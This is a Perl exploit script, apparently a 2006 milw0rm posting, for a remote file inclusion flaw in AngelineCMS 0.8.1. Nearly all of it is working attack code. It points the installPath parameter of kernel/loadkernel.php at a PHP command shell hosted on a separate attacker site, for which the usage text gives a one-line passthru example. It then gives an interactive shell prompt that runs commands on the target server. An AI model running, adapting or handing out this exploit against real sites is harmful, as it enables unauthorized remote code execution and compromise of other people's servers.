#!/usr/bin/perl
##
# AngelineCMS 0.8.1 installpath Remote Code Execution Exploit
# Bug Found & code By K-159 
# code reference from uid0/zod at ExploiterCode.com
##
# echo.or.id (c) 2006
# 
##
# usage:
# perl angelineCMS.pl <target> <cmd shell location> <cmd shell variable>
#
# perl angelineCMS.pl http://target.com/ http://site.com/cmd.txt cmd
#
# cmd shell example: <?passthru($_GET[cmd]);?>
#
# cmd shell variable: ($_GET[cmd]);
##
# #
# 
# Contact: www.echo.or.id #e-c-h-o @irc.dal.net
##

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];

if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}

head();

while()
{
       print "[shell] \$";
while(<STDIN>)
       {
               $cmd=$_;
               chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'kernel/loadkernel.php?installPath='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";

$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[Ã.Âª]/;

if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
       {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}

if($return =~ /(.*)/)


{
       $finreturn = $1;
       $finreturn=~ tr/[Ã.Âª]/[\n]/;
       print "\r\n$finreturn\n\r";
       last;
}

else {print "[shell] \$";}}}last;

sub head()
 {
 print "\n============================================================================\r\n";
 print " *AngelineCMS 0.8.1 installpath Remote Code Execution Exploit*\r\n";
 print "============================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: perl angelineCMS.pl <target> <cmd shell location> <cmd shell variable>\r\n\n";
 print " <Site> - Full path to angelineCMS ex: http://www.site.com/ \r\n";
 print " <cmd shell> - Path to cmd Shell e.g http://www.different-site.com/cmd.txt \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print "============================================================================\r\n";
 print "                           Bug Found by K-159 \r\n";
 print "                    www.echo.or.id #e-c-h-o irc.dal.net \r\n";
 print "============================================================================\r\n";
 exit();
 }

# milw0rm.com [2006-04-04]
